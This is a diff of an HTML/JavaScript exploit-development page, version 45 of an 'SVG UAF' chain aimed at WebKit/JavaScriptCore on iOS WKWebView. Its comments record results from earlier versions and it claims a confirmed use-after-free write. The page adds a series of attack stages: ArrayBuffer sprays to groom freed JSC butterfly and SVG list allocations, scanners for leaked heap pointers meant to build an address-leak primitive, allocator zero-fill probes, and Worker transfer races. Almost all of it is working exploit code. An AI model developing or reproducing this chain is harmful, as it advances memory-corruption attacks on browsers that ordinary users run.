@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>SVG UAF v44</title>
+<title>SVG UAF v45</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#0d0d0d;color:#00ff41;font-family:'Courier New',monospace;padding:16px;min-height:100vh}
@@ -38,81 +38,92 @@ button:disabled{opacity:.3}
 </style>
 </head>
 <body>
-<h2>SVG UAF v44 — WTF::fastMalloc vector groom</h2>
+<h2>SVG UAF v45 — Butterfly groom + allocator zeroing probe</h2>
 <div class="sub">
-v43 ANALYSIS:
-- SRT1/SPL1/PRX1/REP1/WKR1/OOB1/LEN1: JSC hardening holding clean — generic type confusion blocked
-- CLN1: structuredClone correctly rejects Proxy objects
-- SET1-A: ta.set() DID NOT THROW after buf.transfer() detached the buffer mid-operation
-  → JSC snapshots backing store ptr before loop → writes continue into transferred buffer
-  → no throw = buf.transfer() during set() is a write-to-transferred-memory pattern
-- ANI1: SMIL IS running on iOS 26 WKWebView (animVal ≠ baseVal confirmed)
-  → animVal refs survive parent svg removal → kept alive by JS wrappers
-  → SMIL engine continues updating m_value of detached animVal SVGNumbers
+v44 POST-MORTEM:
+- VEC1/2/3: ALL MISS — ROOT CAUSE: WebKit NEVER calls Vector::shrinkCapacity() on SVG lists
+  VEC2 readback=10000..10019 AFTER type change → same vector, same SVGNumbers survived
+  The backing store was never freed → nothing to groom → explains all misses
+- TRN1: ta.set() correctly aborts on detach (no throw, stops writing) — NOT exploitable
+- WAS1: FALSE POSITIVE — undefined = TypedArray length set to 0 after detach, index 0 >= length 0
+  Wasm Memory.grow() CORRECTLY detaches old buffer. Fixed detector in v45.
+- ANI2: CONFIRMED — JS wrapper holds independent Ref<SVGNumber>
+  SVGNumber stays live after removeItem() as long as JS ref exists
+  SMIL allocator did NOT use freelist (animVal shows fresh interpolated values)
 
-KEY INSIGHT — wrong allocator all along:
-  IsoHeap<SVGNumber>: stores individual SVGNumber C++ objects → bump-only → DEAD
-  WTF::fastMalloc: stores SVGList<T>'s INTERNAL VECTOR backing store (array of pointers)
+NEW TARGET: JSC butterfly property storage
+  JSC JS object stores named properties in a "butterfly" allocation (WTF::fastMalloc)
+  Property VALUES are JSValues = NaN-boxed float64 OR raw pointer to JS heap cell
+  When we store an SVGNumber wrapper as a property: its JSValue IS a pointer to the SVGNumber
+  If we groom a freed butterfly with ArrayBuffer → read JSValue pointers → addrof for JS heap!
 
-  Vector<Ref<SVGNumber>> for a 20-element list = 20 × 8 bytes = 160 bytes
-  This 160-byte block is in WTF::fastMalloc, NOT IsoHeap.
-  WTF::fastMalloc uses bmalloc's non-ISO (size-class) path → FREELIST IS USED.
-
-  ATTACK: force vector reallocation → freed vector backing store lands in WTF::fastMalloc
-  freelist → groom with ArrayBuffer → read ArrayBuffer → POINTER LEAK of Ref<SVGNumber>
-  addresses → addrof primitive!
-
-NEW ATTACK SURFACE:
-  SVGAnimatedLengthList.dx/dy on <text> elements = variable-size SVGLength list
-  Grow the list → old vector backing store freed → groom window
-  SVGFEColorMatrixElement type=matrix → type=saturate (20→1 values) → vector shrinks
-  feConvolveMatrix kernelMatrix size change → variable vector size
+CRITICAL QUESTION: does WTF::fastMalloc zero-fill on reuse?
+  If YES → ALL pointer leak via ArrayBuffer is fundamentally blocked
+  If NO  → timing/spray issues fixable
 
 SUITES:
-VEC1: SVGLengthList (text.dx) vector backing store groom
-  → grow/shrink list → groom freed vector slot with ArrayBuffer → pointer leak probe
-VEC2: SVGNumberList type-change groom
-  → feColorMatrix matrix→saturate (20→1 values) → vector freed → ArrayBuffer groom
-VEC3: feConvolveMatrix kernelMatrix size mutation
-  → kernelSize change → variable vector growth/shrink → groom with ArrayBuffer
-TRN1: SET1-A follow-up — capture transferred buffer, measure where set() writes went
-  → buf = ArrayBuffer(N), ta = Float64Array(buf)
-  → during ta.set(srcA), srcA[k] getter calls newBuf = buf.transfer()
-  → AFTER set: check newBuf for the written values (confirm write-to-transferred-memory)
-  → BONUS: try to detect if any adjacent allocation contaminated
-WAS1: WebAssembly Memory.grow() TypedArray invalidation
-  → wasm memory, Float64Array view, memory.grow() → detaches old buffer
-  → continue accessing Float64Array → behavior on detached wasm memory
-SAB1: SharedArrayBuffer + Worker availability check
-  → test if SAB is available in WKWebView iOS 26
-  → if YES: Worker race conditions are possible for next iteration
-SET2: SET1-A exploitation attempt — two adjacent ArrayBuffers, detach-mid-set
-  → alloc A(1024) and B(1024) adjacent, create views, detach A mid-set
-  → try to see if set() can write into B's region
-ANI2: SMIL-trigger freelist probe
-  → build freelist of SVGNumbers FIRST (remove many matrices)
-  → THEN create NEW animation → animVal allocations at creation time
-  → check if any animVal SVGNumber landed on freed baseVal slot
-  → (tests whether SMIL allocator path uses freelist vs JS path)
+ZRO1: fastMalloc zero-fill detector
+  alloc AB → write CANARY → free → force GC → realloc AB same size → check for CANARY
+  Tests if JSC ArrayBuffer allocator recycles without zeroing
+  Multiple size classes: 24, 40, 64, 128, 160, 256, 512 bytes
 
-POINTER DETECTION: float64 value with bits 0x0000_00xx_xxxx_xxxx (arm64 userspace ptr)
-GROOM SUCCESS: ArrayBuffer read contains pointer-shaped values after vector free
+BUT1: JSC butterfly groom — main stage
+  Create JS objects with N named properties (values = SVGNumber wrappers = JS cell pointers)
+  Delete all properties → butterfly freed to WTF::fastMalloc
+  Immediately spray ArrayBuffer(butterfly_size) → check for pointer-like JSValues
+  JSValue cell ptr: upper bits 0x0000_0001... (arm64 JSC heap address)
+  JSValue int: lower 32 bits = int, upper = 0xffff_0000 (NaN-box int tag)
+
+BUT2: Object.create(null) prototype chain butterfly
+  Different butterfly layout, test multiple property counts (8,16,32,64 props)
+  Use Float64/typed values to make JSValues distinguishable
+
+RPI1: SVGNumberList.replaceItem() primitive
+  createSVGNumber() → set value → replaceItem(newNum, index)
+  Old SVGNumber at index is released from list
+  Does this free IsoHeap<SVGNumber>? (no, JS ref holds it)
+  Does this cause the newly inserted SVGNumber to come from freelist? (test with 4000-item freelist)
+  Actually: test if NEWLY CREATED SVGNumbers via createSVGNumber() use same IsoHeap<SVGNumber>
+
+FRC1: feConvolveMatrix kernelMatrix FIXED (v44 used wrong attr name 'kernel' not 'kernelMatrix')
+  Fixed attribute: setAttribute('kernelMatrix', ...) + setAttribute('order', 'N N')
+  Test all 9 attribute names for kernelMatrix access
+
+WRK1: Worker + postMessage transferable race
+  Create Worker, postMessage() ArrayBuffer transfer between Worker + main thread
+  Race with SVG operations in main thread
+  Also test: can Worker access DOM? (no, but messageChannel timing)
+
+ORF1: Orphaned SVGNumber reference chain
+  removeItem() ALL items from live SVGNumberList while holding all refs
+  List is empty but all SVGNumbers still live (JS refs hold them)
+  Now setAttribute() to rebuild list → 20 NEW SVGNumbers created
+  OLD refs (orphaned) still live, NEW refs accessible via baseVal[]
+  Delete the feColorMatrix → NEW SVGNumbers freed (only list held refs)
+  4000× repeat → build up maximal IsoHeap freelist
+  THEN create new feColorMatrix → does it see freelist? (baseline bump position test)
+
+PTR1: Pointer confirmation via UAF write + read
+  We KNOW we have UAF write (Stage 0 confirmed)
+  Stress test: write known TAG patterns at many different dangling refs
+  Read back after free → measure what fraction survive
+  Any non-TAG read = something wrote there = allocator activity
 </div>
 <div id="controls">
-  <button onclick="runVEC1()">VEC1</button>
-  <button onclick="runVEC2()">VEC2</button>
-  <button onclick="runVEC3()">VEC3</button>
-  <button onclick="runTRN1()">TRN1</button>
-  <button onclick="runWAS1()">WAS1</button>
-  <button onclick="runSAB1()">SAB1</button>
-  <button onclick="runSET2()">SET2</button>
-  <button onclick="runANI2()">ANI2</button>
+  <button onclick="runZRO1()">ZRO1</button>
+  <button onclick="runBUT1()">BUT1</button>
+  <button onclick="runBUT2()">BUT2</button>
+  <button onclick="runRPI1()">RPI1</button>
+  <button onclick="runFRC1()">FRC1</button>
+  <button onclick="runWRK1()">WRK1</button>
+  <button onclick="runORF1()">ORF1</button>
+  <button onclick="runPTR1()">PTR1</button>
   <button onclick="runAll()">RUN ALL</button>
   <button onclick="copyLog()">COPY</button>
   <button onclick="clearAll()">CLR</button>
 </div>
 <div id="log"></div>
-<div id="sp"><div class="sh">⚡ v44 — EXPLOIT CHAIN STATUS</div><div class="sb" id="sb"></div></div>
+<div id="sp"><div class="sh">⚡ v45 — EXPLOIT CHAIN STATUS</div><div class="sb" id="sb"></div></div>
 <script>
 var SVG_NS='http://www.w3.org/2000/svg';
 var EL=document.getElementById('log');
@@ -120,14 +131,14 @@ var SP=document.getElementById('sp');
 var SB=document.getElementById('sb');
 
 var R={
-  vec1:{hit:false,ptrs:[],detail:''},
-  vec2:{hit:false,ptrs:[],detail:''},
-  vec3:{hit:false,ptrs:[],detail:''},
-  trn1:{hit:false,writeConfirmed:false,detail:''},
-  was1:{hit:false,detail:''},
-  sab1:{available:false,detail:''},
-  set2:{hit:false,detail:''},
-  ani2:{hit:false,detail:''},
+  zro1:{zeros:true,sizes:{},detail:''},
+  but1:{hit:false,ptrs:[],detail:''},
+  but2:{hit:false,ptrs:[],detail:''},
+  rpi1:{hit:false,detail:''},
+  frc1:{hit:false,detail:''},
+  wrk1:{hit:false,detail:''},
+  orf1:{hit:false,detail:''},
+  ptr1:{hit:false,detail:''},
 };
 
 function log(m,c){var s=document.createElement('span');if(c)s.className=c;s.textContent=m+'\n';EL.appendChild(s);EL.scrollTop=EL.scrollHeight;}
@@ -139,7 +150,6 @@ function clearAll(){EL.innerHTML='';SP.classList.remove('on');SB.innerHTML='';}
 function dis(d){var b=document.querySelectorAll('button');for(var i=0;i<b.length;i++){var f=b[i].getAttribute('onclick')||'';if(f.indexOf('copy')===-1&&f.indexOf('clear')===-1)b[i].disabled=d;}}
 window.onerror=function(m,u,l){log('[CRASH/EXCEPTION] '+m+' L'+l,'bad');return false;};
 
-// Pointer analysis helpers
 function f64bits(v){
   var b=new ArrayBuffer(8);var d=new DataView(b);d.setFloat64(0,v,false);
   return{hi:d.getUint32(0,false),lo:d.getUint32(4,false),
@@ -148,24 +158,30 @@ function f64bits(v){
 function looksLikePtr(v){
   if(!isFinite(v)||isNaN(v)||v===0)return false;
   var b=f64bits(v);
-  // arm64 userspace: upper 32 bits = 0x00000001 to 0x00007fff (typical iOS app range)
-  // Also detect kernel-tagged ptrs and pac-bits ptrs
   return(b.hi>=1&&b.hi<=0x00007fff);
 }
-function scanForPtrs(arr,label){
-  var hits=[];
-  for(var i=0;i<arr.length;i++){
-    var v=arr[i];
-    if(looksLikePtr(v)){
-      var b=f64bits(v);
-      hits.push({idx:i,val:v,hex:b.hex,hi:b.hi,lo:b.lo});
-      log('  ['+label+']['+i+']='+b.hex+' ★ POINTER','win');
-    }
-  }
-  return hits;
+function looksLikeJSValue(v){
+  // JSC JSValue (64-bit):
+  // Cell ptr: upper 16 bits = 0x0001 (JSC MarkedSpace cells start high)
+  // Int32:    0xFFFF0000 in upper 32 bits (NaN-boxed int)
+  // Double:   various non-zero upper bits
+  if(v===0||v===undefined||isNaN(v))return false;
+  var b=f64bits(v);
+  // Cell pointer pattern on arm64: 0x00000001_xxxxxxxx (DRAM range)
+  var isCell=(b.hi>=1&&b.hi<=0x00007fff);
+  // NaN-boxed int: 0xffff0000 in upper bits
+  var isInt=(b.hi>>>16)===0xffff;
+  return{isCell:isCell,isInt:isInt,hit:isCell||isInt,hex:b.hex};
 }
-
-// Make feColorMatrix
+function forceGC(){
+  // Try to trigger GC by allocating and releasing large amounts
+  var trash=[];
+  for(var i=0;i<512;i++)trash.push(new ArrayBuffer(4096));
+  trash=null;
+  // Also try explicit GC if available (usually not in production)
+  if(typeof gc==='function')try{gc();}catch(e){}
+}
+function identity20(){return[1,0,0,0,0,0,1,0,0,0,0,0,1,0,0,0,0,0,1,0];}
 function makeFCM(vals,fid){
   fid=fid||('f'+Math.random().toString(36).slice(2,8));
   var svg=document.createElementNS(SVG_NS,'svg');
@@ -180,269 +196,472 @@ function makeFCM(vals,fid){
   document.body.appendChild(svg);
   return{svg:svg,fcm:fcm};
 }
-function identity20(){return[1,0,0,0,0,0,1,0,0,0,0,0,1,0,0,0,0,0,1,0];}
 function cleanupD(d){if(d&&d.svg&&d.svg.parentNode)d.svg.parentNode.removeChild(d.svg);}
 
 /*
- * VEC1: SVGLengthList vector backing store groom
+ * ZRO1: fastMalloc / ArrayBuffer backing-store zero-fill detector
  *
- * SVGAnimatedLengthList (e.g. text.dx) stores items in a WTF::Vector<Ref<SVGLength>>.
- * The vector backing store = N * sizeof(Ref<SVGLength>) = N * 8 bytes.
- * When the list grows, WTF::Vector reallocates: old backing store freed to WTF::fastMalloc.
- * WTF::fastMalloc is bmalloc non-ISO = freelist-based = REUSABLE.
+ * GOAL: determine if JSC's ArrayBuffer backing store allocator zeroes memory on reuse.
  *
- * PLAN:
- * 1. Create <text> with dx="v1 v2 v3" (3 items → 24-byte vector backing store)
- * 2. Grow dx to 20 items → WTF::Vector grows → old 24-byte block freed
- * 3. Immediately alloc ArrayBuffer(24) → might land at freed 24-byte slot
- * 4. Scan ArrayBuffer as Float64 → pointer-shaped values = leaked SVGLength addresses
+ * METHOD:
+ * 1. Allocate AB(N), write CANARY pattern to every byte
+ * 2. Release all refs (let AB go out of scope + GC)
+ * 3. Allocate new AB(N) — same size
+ * 4. Read as Uint32Array
+ * 5. If ANY slot != 0 → allocator reuses WITHOUT zeroing → stale data readable
  *
- * Also try: alloc many ArrayBuffers of various sizes to increase hit probability
+ * Test multiple size classes to find non-zeroing path.
+ *
+ * ALSO: test JSC ArrayBuffer "recycling pool" — JSC might recycle ABs of the same size
+ * without going through fastMalloc at all. If the recycled buffer contains our CANARY,
+ * that's JSC's own recycling and we can exploit that path.
  */
-async function runVEC1(q){
-  if(!q){dis(true);sep();log('VEC1: SVGLengthList vector backing store groom','inf');sep();}
+async function runZRO1(q){
+  if(!q){dis(true);sep();log('ZRO1: ArrayBuffer backing store zero-fill detection','inf');sep();}
 
-  var svgNS='http://www.w3.org/2000/svg';
+  var SIZES=[16,24,32,40,48,56,64,80,96,112,128,144,160,192,256,320,512,1024,4096];
+  var CANARY_HI=0xDEADBEEF;var CANARY_LO=0xCAFEBABE;
+  // As float64 (NaN-boxing might interfere with JSC, use Uint32 instead)
+  // Write pattern: alternating 0xDEADBEEF / 0xCAFEBABE in 32-bit words
 
-  // Setup: SVG with text element
-  var svgEl=document.createElementNS(svgNS,'svg');
-  svgEl.setAttribute('width','1');svgEl.setAttribute('height','1');
-  svgEl.style.cssText='position:fixed;top:-9999px;left:-9999px;opacity:0;pointer-events:none';
-  var textEl=document.createElementNS(svgNS,'text');
-  textEl.setAttribute('dx','10 20 30'); // 3 SVGLength items → 3×8=24 byte vector
-  svgEl.appendChild(textEl);
-  document.body.appendChild(svgEl);
-  await raf();
+  R.zro1.zeros=true; // assume zeroing until proven otherwise
 
-  try{
-    // Verify we can access dx.baseVal
-    var dl=textEl.dx&&textEl.dx.baseVal;
-    log('  VEC1: text.dx.baseVal available='+(dl!=null)+' length='+(dl?dl.numberOfItems||dl.length:'n/a'),'dim');
+  for(var si=0;si<SIZES.length;si++){
+    var N=SIZES[si];
+    var nonZeroFinds=0;
+    var rounds=10; // test 10 rounds per size
 
-    // Build a spray of ArrayBuffers at various sizes to catch the freed slot
-    var SIZES=[24,32,40,48,56,64,72,80,96,112,128,160,192,256];
-    var sprays={};
+    for(var r=0;r<rounds;r++){
+      // Alloc
+      var ab=new ArrayBuffer(N);
+      var u32=new Uint32Array(ab);
+      // Write CANARY to all 32-bit slots
+      for(var j=0;j<u32.length;j++)u32[j]=(j%2===0)?CANARY_HI:CANARY_LO;
+      // Verify write
+      if(u32[0]!==CANARY_HI){log('  ZRO1['+N+']: write verify failed!','bad');break;}
 
-    // Phase 1: baseline — allocate reference ArrayBuffers to "warm up" the allocator
-    var warm=[];for(var i=0;i<64;i++)warm.push(new ArrayBuffer(24));
-    // Free some to create freelist entries
-    warm.splice(0,32); // release 32 of them back
-    await raf();
+      // Drop refs — force the buffer to become garbage
+      u32=null;ab=null;
 
-    // Phase 2: Force vector reallocation
-    // Change dx from 3 items to 20 items → vector grows → old 3×8=24 byte block freed
-    var growStr='';for(var i=0;i<20;i++)growStr+=(i*5)+' ';
-    textEl.setAttribute('dx',growStr.trim());
-    await raf(); // let the DOM update process
+      // Force GC
+      forceGC();
 
-    // Phase 3: IMMEDIATELY spray ArrayBuffer(24) to catch the freed 24-byte vector slot
-    var spray24=[];for(var i=0;i<512;i++)spray24.push(new ArrayBuffer(24));
-    await raf();
+      // Immediately re-alloc same size
+      var ab2=new ArrayBuffer(N);
+      var u32b=new Uint32Array(ab2);
 
-    // Also spray size 160 (20-item vector = 20×8=160 bytes)
-    // Now change dx back to 3 items: 20-item vector freed, 3-item vector reallocated
-    textEl.setAttribute('dx','1 2 3');
-    await raf();
-    var spray160=[];for(var i=0;i<512;i++)spray160.push(new ArrayBuffer(160));
-    await raf();
-
-    // Now try 20 items again → old 3-item vector freed (24 bytes)
-    textEl.setAttribute('dx',growStr.trim());
-    await raf();
-    var spray24b=[];for(var i=0;i<512;i++)spray24b.push(new ArrayBuffer(24));
-    await raf();
-
-    // Scan all sprayed ArrayBuffers for pointer-like values
-    log('  VEC1: scanning 512 × 24-byte ArrayBuffers (first grow)...','dim');
-    var allPtrs=[];
-    for(var i=0;i<spray24.length;i++){
-      var f64=new Float64Array(spray24[i]);
-      for(var j=0;j<f64.length;j++){
-        if(looksLikePtr(f64[j])){
-          var b=f64bits(f64[j]);
-          allPtrs.push({buf:'spray24['+i+']['+j+']',hex:b.hex});
+      // Check for non-zero values
+      for(var j=0;j<u32b.length;j++){
+        if(u32b[j]!==0){
+          nonZeroFinds++;
+          if(u32b[j]===CANARY_HI||u32b[j]===CANARY_LO){
+            log('  ZRO1['+N+']: ★ CANARY FOUND! round='+r+' slot='+j+' val=0x'+u32b[j].toString(16),'win');
+            R.zro1.zeros=false;
+            R.zro1.sizes[N]='CANARY_FOUND';
+          }else{
+            if(nonZeroFinds<=2)log('  ZRO1['+N+']: non-zero (not canary): slot='+j+' val=0x'+u32b[j].toString(16),'crit');
+            R.zro1.sizes[N]='NONZERO';
+          }
+          break; // found non-zero in this round
         }
       }
+      u32b=null;ab2=null;
+      if(R.zro1.sizes[N]==='CANARY_FOUND')break; // confirmed non-zeroing for this size
     }
-    log('  VEC1: scanning 512 × 160-byte ArrayBuffers (20→3 shrink)...','dim');
-    for(var i=0;i<spray160.length;i++){
-      var f64=new Float64Array(spray160[i]);
-      for(var j=0;j<f64.length;j++){
-        if(looksLikePtr(f64[j])){
-          var b=f64bits(f64[j]);
-          allPtrs.push({buf:'spray160['+i+']['+j+']',hex:b.hex});
-        }
-      }
-    }
-    log('  VEC1: scanning 512 × 24-byte ArrayBuffers (second grow)...','dim');
-    for(var i=0;i<spray24b.length;i++){
-      var f64=new Float64Array(spray24b[i]);
-      for(var j=0;j<f64.length;j++){
-        if(looksLikePtr(f64[j])){
-          var b=f64bits(f64[j]);
-          allPtrs.push({buf:'spray24b['+i+']['+j+']',hex:b.hex});
-        }
-      }
-    }
+    if(!R.zro1.sizes[N])R.zro1.sizes[N]='zeros';
+    log('  ZRO1['+N+']: '+R.zro1.sizes[N],'dim');
+    await raf();
+  }
 
-    log('  VEC1: total pointer-like values found: '+allPtrs.length,'dim');
-    if(allPtrs.length>0){
-      R.vec1.hit=true;
-      R.vec1.ptrs=allPtrs;
-      for(var i=0;i<Math.min(10,allPtrs.length);i++){
-        log('  ★ LEAK: '+allPtrs[i].buf+' = '+allPtrs[i].hex,'win');
-      }
-    }else{
-      log('  VEC1: no pointer leaks (allocator not landing on freed vector slots)','dim');
+  // Also test: alloc same buffer MANY TIMES rapidly — does JSC recycle?
+  log('  ZRO1: rapid-recycle test (no GC between alloc+free)...','dim');
+  var prevCanary=false;
+  for(var r=0;r<50;r++){
+    var ab=new ArrayBuffer(160);
+    var u32=new Uint32Array(ab);
+    if(u32[0]===CANARY_HI&&u32[10]===CANARY_LO){
+      prevCanary=true;
+      log('  ZRO1[rapid-160]: ★ RECYCLED with CANARY on round '+r,'win');
+      R.zro1.zeros=false;break;
     }
+    for(var j=0;j<u32.length;j++)u32[j]=(j%2===0)?CANARY_HI:CANARY_LO;
+    // DON'T force GC — just drop ref immediately
+    u32=null;ab=null;
+  }
+  if(!prevCanary)log('  ZRO1[rapid-160]: all zeros (no recycling or zeroing on recycle)','dim');
 
-    // Cleanup
-    warm=null;spray24=null;spray160=null;spray24b=null;
-  }catch(e){log('  VEC1 EXCEPTION: '+e,'bad');}
-
-  svgEl.parentNode&&svgEl.parentNode.removeChild(svgEl);
-  R.vec1.detail='hit='+R.vec1.hit+' ptrs='+R.vec1.ptrs.length;
-  log('  VEC1: hit='+R.vec1.hit+' ptrs_found='+R.vec1.ptrs.length,R.vec1.hit?'win':'dim');
+  R.zro1.detail='zeros='+R.zro1.zeros;
+  log('  ZRO1: zeroing='+R.zro1.zeros+(R.zro1.zeros?' (fastMalloc zeroes — ALL groom approaches blocked)':' (NO ZEROING — groom feasible!)'),R.zro1.zeros?'dim':'win');
   if(!q)dis(false);
 }
 
 /*
- * VEC2: feColorMatrix type-change groom
+ * BUT1: JSC butterfly property storage groom — PRIMARY STAGE
  *
- * feColorMatrix type=matrix → type=saturate:
- * - matrix: 20 SVGNumbers in list → vector = 20×8 = 160 bytes
- * - saturate: 1 SVGNumber in list → vector = 1×8 = 8 bytes (or reallocated)
+ * JSC stores an object's named properties in a "butterfly" — a WTF::fastMalloc
+ * allocation. Layout: [out-of-line named props grow LEFT from center][header][indexed props grow RIGHT]
  *
- * When type changes, SVGFEColorMatrixElement::syncAttribute() is called,
- * which calls SVGNumberList::setSingleItem() or clears and rebuilds the list.
- * The old 160-byte vector backing store MIGHT be freed to WTF::fastMalloc.
+ * Each property slot = 64-bit JSValue:
+ *   - If value is a JS cell (object): JSValue = raw pointer to JSObject in MarkedSpace
+ *   - If value is int32: NaN-boxed (upper 32 bits = 0xFFFF0000)
+ *   - If value is float64: IEEE double
  *
  * PLAN:
- * 1. Keep feColorMatrix in DOM (don't remove)
- * 2. Get ref to fcm.values.baseVal (live SVGNumberList)
- * 3. Get all 20 individual refs (fcm.values.baseVal[i])
- * 4. Change type to saturate → list truncates → old vector freed
- * 5. Spray ArrayBuffer(160) to catch freed vector slot
- * 6. Check ArrayBuffer for pointer-like values
- * 7. Those pointers = addresses of Ref<SVGNumber> entries in the old vector
- *    = addresses of SVGNumber objects in IsoHeap<SVGNumber>!
+ * 1. Create JS object `obj` and set exactly N named properties
+ *    - Include SVGNumber JS wrappers as some property values → cell pointers in butterfly!
+ * 2. Delete ALL N properties → JSC might free the butterfly to WTF::fastMalloc
+ *    - Caveat: JSC uses Structure to track property layout; delete might not immediately free
+ * 3. OR: set obj = null + GC → whole object freed including butterfly
+ * 4. Immediately spray ArrayBuffer(butterfly_size) → groom freed butterfly slot
+ * 5. Read ArrayBuffer → scan for JSValue cell pointers (arm64 pointer shaped)
+ *
+ * COMPLICATION: deleting properties in JSC creates new "Structures" (property maps)
+ * that may or may not result in butterfly reallocation. Full deletion often transitions
+ * to a "dictionary mode" that might or might not free the old butterfly.
+ *
+ * APPROACH A: delete all props → JSC dictionary mode → new butterfly freed?
+ * APPROACH B: obj = null + GC → butterfly freed as part of object collection
+ *   (can't use this because once we null obj, we don't know what the butterfly contained)
+ *
+ * For B, we pre-record expected butterfly contents by creating a TWIN object
+ * with identical properties and keeping it alive for reference.
  */
-async function runVEC2(q){
-  if(!q){dis(true);sep();log('VEC2: feColorMatrix type-change vector groom','inf');sep();}
+async function runBUT1(q){
+  if(!q){dis(true);sep();log('BUT1: JSC butterfly property storage groom','inf');sep();}
 
-  var TAG_V2=5551234.0; // recognizable float to write into SVGNumber m_value
+  var TAG_BUT=1234567.89;
+
+  // Setup: create feColorMatrix and get some live SVGNumber wrappers
+  var d=makeFCM(identity20());
+  await raf();
+  var svgRefs=[];
+  for(var i=0;i<20;i++){try{svgRefs.push(d.fcm.values.baseVal[i]);}catch(e){}}
+  log('  BUT1: got '+svgRefs.length+' live SVGNumber JS wrappers','dim');
+
+  try{
+    // Test butterfly sizes based on property count:
+    // JSC out-of-line butterfly: each slot = 8 bytes (JSValue)
+    // Header = 8 bytes (arrayLength + vectorLength)
+    // N properties → butterfly_size = (N * 8) + 8 bytes minimum
+    // But JSC uses nextPowerOfTwo for capacity, so 20 props → capacity 32 → 32*8+8 = 264 bytes
+
+    var propCounts=[8,16,20,24,32];
+
+    for(var pi=0;pi<propCounts.length;pi++){
+      var NPROPS=propCounts[pi];
+      var butterflySizeEst=NPROPS*8+8; // estimated butterfly backing store size
+
+      // Create object with NPROPS properties
+      // Mix SVGNumber wrappers (cell ptrs) and float values (detectable patterns)
+      var objA={};
+      for(var i=0;i<NPROPS;i++){
+        if(i<svgRefs.length){
+          objA['p'+i]=svgRefs[i]; // cell pointer JSValue
+        }else{
+          objA['p'+i]=TAG_BUT+i; // float JSValue
+        }
+      }
+
+      // Create TWIN object (keep alive as reference)
+      var objB={};
+      for(var i=0;i<NPROPS;i++)objB['p'+i]=objA['p'+i];
+
+      log('  BUT1[N='+NPROPS+']: objects created, butterfly_est='+butterflySizeEst+' bytes','dim');
+
+      // APPROACH A: delete all props on objA
+      // This forces JSC to dictionary mode and potentially frees the old butterfly
+      for(var i=0;i<NPROPS;i++)try{delete objA['p'+i];}catch(e){}
+
+      // Pre-alloc to warm freelist
+      var warm=[];for(var i=0;i<64;i++)warm.push(new ArrayBuffer(butterflySizeEst));
+      warm.splice(0,32);
+
+      // IMMEDIATELY spray ArrayBuffer of estimated butterfly size
+      var spray=[];for(var i=0;i<1024;i++)spray.push(new ArrayBuffer(butterflySizeEst));
+      await raf();
+
+      // Scan spray for JSValue-like patterns
+      var ptrHits=[];var intHits=[];
+      for(var i=0;i<spray.length;i++){
+        var f64=new Float64Array(spray[i]);
+        for(var j=0;j<f64.length;j++){
+          var jsv=looksLikeJSValue(f64[j]);
+          if(jsv.isCell){ptrHits.push({i:i,j:j,hex:jsv.hex});}
+          else if(jsv.isInt){intHits.push({i:i,j:j,hex:jsv.hex});}
+        }
+      }
+      log('  BUT1[N='+NPROPS+']: cell-ptr hits='+ptrHits.length+' int-jsval hits='+intHits.length,'dim');
+      if(ptrHits.length>0){
+        R.but1.hit=true;
+        for(var i=0;i<Math.min(5,ptrHits.length);i++){
+          log('  ★ BUT1: cell ptr: spray['+ptrHits[i].i+']['+ptrHits[i].j+']='+ptrHits[i].hex,'win');
+          R.but1.ptrs.push(ptrHits[i].hex);
+        }
+      }
+
+      warm=null;spray=null;
+      await raf();
+    }
+
+    // APPROACH B: null + GC
+    // Create object, store SVGNumber refs, null the object, GC, spray, scan
+    log('  BUT1: approach B (null + GC)...','dim');
+    var objC={};
+    for(var i=0;i<20;i++){
+      if(i<svgRefs.length)objC['prop'+i]=svgRefs[i];
+      else objC['prop'+i]=TAG_BUT+i;
+    }
+    objC=null; // drop ref
+    forceGC();
+    await raf();
+
+    // Spray multiple sizes since we don't know exact butterfly size
+    var sprayB=[];
+    for(var i=0;i<256;i++){
+      sprayB.push(new ArrayBuffer(160));
+      sprayB.push(new ArrayBuffer(168));
+      sprayB.push(new ArrayBuffer(176));
+      sprayB.push(new ArrayBuffer(264));
+    }
+    await raf();
+
+    var ptrHitsB=0;
+    for(var i=0;i<sprayB.length;i++){
+      var f64=new Float64Array(sprayB[i]);
+      for(var j=0;j<f64.length;j++){
+        var jsv=looksLikeJSValue(f64[j]);
+        if(jsv.isCell){ptrHitsB++;
+          if(ptrHitsB<=3)log('  ★ BUT1-B: cell ptr: buf['+i+']['+j+']='+jsv.hex,'win');
+          R.but1.hit=true;R.but1.ptrs.push(jsv.hex);
+        }
+      }
+    }
+    log('  BUT1-B: cell-ptr hits='+ptrHitsB,'dim');
+    sprayB=null;
+
+  }catch(e){log('  BUT1 EXCEPTION: '+e,'bad');}
+
+  cleanupD(d);
+  R.but1.detail='hit='+R.but1.hit+' ptrs='+R.but1.ptrs.length;
+  log('  BUT1: hit='+R.but1.hit+' ptrs_found='+R.but1.ptrs.length,R.but1.hit?'win':'dim');
+  if(!q)dis(false);
+}
+
+/*
+ * BUT2: Butterfly groom with Object.create(null) + TypedArray JSValues
+ *
+ * Different object creation path than BUT1 to test JSC's Property map.
+ * Use numeric-keyed properties AND named properties to test different butterfly layouts.
+ *
+ * ALSO: test if Float64Array view itself leaks its backing store address via
+ * JSC's internal buffer pointer storage.
+ */
+async function runBUT2(q){
+  if(!q){dis(true);sep();log('BUT2: Butterfly groom variant + TypedArray backing ptr test','inf');sep();}
+
+  try{
+    // Test 1: Object.create(null) with various property counts
+    var COUNTS=[8,12,16,24,32,48,64];
+    for(var ci=0;ci<COUNTS.length;ci++){
+      var N=COUNTS[ci];
+      var o=Object.create(null);
+      for(var i=0;i<N;i++)o['k'+i]=Math.PI*i+1.23456789; // distinctive float values
+
+      // Kill the object
+      o=null;forceGC();
+
+      // Spray 256 × (N*8+16) sized buffers (estimated butterfly size)
+      var est=N*8+16;
+      var s=[];for(var i=0;i<256;i++)s.push(new ArrayBuffer(est));
+      await raf();
+
+      var hits=0;
+      for(var i=0;i<s.length;i++){
+        var f64=new Float64Array(s[i]);
+        for(var j=0;j<f64.length;j++){
+          // Look for our Math.PI * i + 1.23456789 pattern
+          // Pi*0+1.234... = 1.234... (won't look like ptr)
+          // Just look for pointer-shaped values
+          if(looksLikeJSValue(f64[j]).isCell){hits++;
+            if(hits<=2)log('  BUT2[N='+N+']: cell hit: '+f64bits(f64[j]).hex,'win');
+            R.but2.hit=true;R.but2.ptrs.push(f64bits(f64[j]).hex);
+          }
+        }
+      }
